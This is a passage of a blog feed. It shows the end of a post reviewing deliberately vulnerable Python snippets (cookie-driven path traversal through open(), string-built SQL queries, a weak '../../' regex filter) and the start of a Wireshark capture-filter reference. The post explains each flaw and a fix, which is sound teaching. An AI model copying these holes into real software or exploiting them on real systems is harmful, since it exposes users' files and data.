&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Hello&amp;lt;&#x2F;title&amp;gt;&amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;h1&amp;gt;Hello &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;h1&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; % username, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ == &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;:
&lt;&#x2F;span&gt;&lt;span&gt;    webServer = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTPServer&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.0.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;), MyServer)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serve_forever&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;KeyboardInterrupt:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;    webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;server_close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Server stopped.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The weakness in the code snippet can be found when the cookie &lt;code&gt;session_id&lt;&#x2F;code&gt; value is read by using &lt;code&gt;open&lt;&#x2F;code&gt; method. The cookie can act as a source of malicious input and by modifying the cookie value contained in &lt;code&gt;session_id&lt;&#x2F;code&gt;, the &lt;code&gt;open&lt;&#x2F;code&gt; method can be vulnerable if validation of the input is not performed. Python&#x27;s &lt;code&gt;open&lt;&#x2F;code&gt; method is designed to open a file and read the file line by line. Knowing this fact, if the cookie value input contains a directory traversal path such as &lt;code&gt;..&#x2F;..&#x2F;file.txt&lt;&#x2F;code&gt; the &lt;code&gt;open&lt;&#x2F;code&gt; method will read the contents as such. A sample output can be seen like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span&gt; curl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -b &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;session_id=key.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; http:&#x2F;&#x2F;localhost:1337
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Hello&amp;lt;&#x2F;title&amp;gt;&amp;lt;&#x2F;head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Hello &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span&gt; read
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;h1&amp;gt;&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;%
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;python-05&quot;&gt;Python 05&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;get_post&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;post_id&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    conn = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_db_connection&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    num_format = re.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;compile&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, re.M)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;re.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(num_format,post_id):
&lt;&#x2F;span&gt;&lt;span&gt;      post = conn.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; posts &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; id &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;+post_id).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchone&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      conn.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;post is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abort&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;404&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;post
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abort&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;404&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The weakness in the code snippet can be found in the &lt;code&gt;conn.execute&lt;&#x2F;code&gt; as it&#x27;s susceptible to SQL injection. The &lt;code&gt;post_id&lt;&#x2F;code&gt; can act as a malicious source of which if the &lt;code&gt;post_id&lt;&#x2F;code&gt; is not validated or sanitized, you can append other SQL query operators that would modify the statement to extract sensitive information from other fields. To mitigate against this type of attack, never use the input directly and use prepared statements. Prepared statement is also called parameterized queries which is a coding technique to define the SQL statement first then pass in the parameter to the query later. If a malicious input would be attempted, the input will be treated as a data instead of code.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;python-06&quot;&gt;Python 06&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;http.server &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;BaseHTTPRequestHandler, HTTPServer
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;os.path &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;exists
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;MyServer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;BaseHTTPRequestHandler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;do_GET&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;      path = os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getcwd&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      pattern = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\.\.\&#x2F;\.\.\&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;re.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(pattern, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.path ):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_response&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;404&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return
&lt;&#x2F;span&gt;&lt;span&gt;      path += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.path
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;endswith&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;):
&lt;&#x2F;span&gt;&lt;span&gt;        path+=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;index.html&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(path)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exists&lt;&#x2F;span&gt;&lt;span&gt;(path):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_response&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-type&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end_headers&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(path).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_response&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;404&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;          
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ == &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;:
&lt;&#x2F;span&gt;&lt;span&gt;    webServer = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTPServer&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.0.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;), MyServer)
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serve_forever&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;KeyboardInterrupt:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;    webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;server_close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Server stopped.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The weakness in this python code can be found in the &lt;code&gt;pattern&lt;&#x2F;code&gt; variable. The regex pattern assigned to the variable is a string filter designed to keep out strings in the URL that contain &lt;code&gt;..&#x2F;..&#x2F;&lt;&#x2F;code&gt;. However, I still don&#x27;t know how this filtering can be bypassed as I&#x27;ve tried all sorts of combination which includes trying to manipulate the &lt;code&gt;getcwd&lt;&#x2F;code&gt; method.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Wireshark Tutorial</title>
        <published>2022-07-01T00:00:00+00:00</published>
        <updated>2022-07-01T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/tutorial-wireshark/" type="text/html"/>
        <id>https://johntuyen.com/posts/tutorial-wireshark/</id>
        
        <content type="html">&lt;h1 id=&quot;wireshark&quot;&gt;Wireshark&lt;&#x2F;h1&gt;
&lt;p&gt;I wouldn&#x27;t say this is much of a tutorial but rather a quick protocol reference to read results from Wireshark and methods on how to extract data from data streams. The pattern of how to analyze protocols is similar across multiple protocols so if you learn one technique, the variation from the next shouldn&#x27;t be difficult unless some complicated handshaking is involved like SSL&#x2F;TLS. This guide should illuminate the common features used and most time spent in Wireshark.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;essentials-capture-filters&quot;&gt;Essentials: Capture Filters&lt;&#x2F;h2&gt;
&lt;p&gt;Capture Filters are set before starting a packet capture and cannot be modified during the capture. This is where you set the parameters of which you want to capture data from specific or range of targets.
&lt;a href=&quot;https:&#x2F;&#x2F;wiki.wireshark.org&#x2F;CaptureFilters&quot;&gt;https:&#x2F;&#x2F;wiki.wireshark.org&#x2F;CaptureFilters&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;wireshark-main-window.png&quot; alt=&quot;Wireshark Main Window&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Common examples of what you can do with capture filters:&lt;&#x2F;p&gt;
&lt;p&gt;Capture only traffic to or from IP address 172.18.5.4:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host 172.18.5.4
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture traffic to or from a range of IP addresses:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;net 192.168.0.0&#x2F;24
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;or&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;net 192.168.0.0 mask 255.255.255.0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture traffic from a range of IP addresses:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;src net 192.168.0.0&#x2F;24
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;or&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;src net 192.168.0.0 mask 255.255.255.0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture traffic to a range of IP addresses:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;dst net 192.168.0.0&#x2F;24
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;or&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;dst net 192.168.0.0 mask 255.255.255.0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture only DNS (port 53) traffic:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;port 53
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture non-HTTP and non-SMTP traffic on your server (both are equivalent):&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host www.example.com and not (port 80 or port 25)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;host www.example.com and not port 80 and not port 25
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture except all ARP and DNS traffic:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;port not 53 and not arp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Capture traffic within a range of ports&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;(tcp[0:2] &amp;gt; 1500 and tcp[0:2] &amp;lt; 1550) or (tcp[2:2] &amp;gt; 1500 and tcp[2:2] &amp;lt; 1550)
